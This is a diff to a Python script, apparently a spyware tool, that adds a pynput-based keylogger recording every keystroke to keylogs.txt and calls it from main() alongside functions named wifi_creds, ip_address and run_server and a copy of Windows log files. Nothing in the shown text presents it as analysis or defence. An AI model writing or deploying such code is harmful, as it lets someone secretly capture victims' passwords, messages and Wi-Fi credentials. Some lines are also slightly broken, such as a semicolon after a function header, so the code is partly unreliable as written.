@@ -73,6 +73,21 @@ def timeZone();
     #print(time.strfTime('%Y-%m-%d %H:%M:%:S'))
     #^^this will print the new time zone of the system 
     
+#Key logger to see all of the user keyboard inputs
+def key_logger():
+    from pynput.keyboard import Key, Listener
+    import logging
+    
+    f = open("keylogs.txt", "a")
+    log_dir = ""
+    logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s:%(message)a')
+    def on_press(key):
+        logging.info(str(key))
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+    f.close()
+    
+    
 
 def main():
     dir_create()
@@ -80,6 +95,7 @@ def main():
     background()
     print("Wallpaper successfully applied")
     ip_address()
+    key_logger()
     copy_file("C:/WindowsLogs/","C:/test/")
     wifi_creds()
     run_server()
